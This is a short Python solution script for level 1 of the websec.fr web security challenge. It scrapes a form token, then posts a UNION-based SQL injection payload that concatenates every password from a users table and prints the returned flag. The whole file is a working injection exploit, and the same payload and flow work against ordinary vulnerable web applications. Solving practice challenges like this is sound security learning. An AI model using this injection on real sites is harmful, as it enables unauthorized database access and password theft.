import httpx
import re

url = "https://websec.fr/level01/index.php"
injection = "1 UNION SELECT 1, GROUP_CONCAT(password) FROM users;-- "

with httpx.Client() as client:
    r1 = client.get(url)
    token = re.search(r'token" value="(.*)"', r1.text).group(1)

    r2 = client.post(url, data = { "user_id" : injection, "token" : token, "submit" : "Submit" })
    flag = re.search(r'WEBSEC\{(.*)\}', r2.text).group()
    print(flag)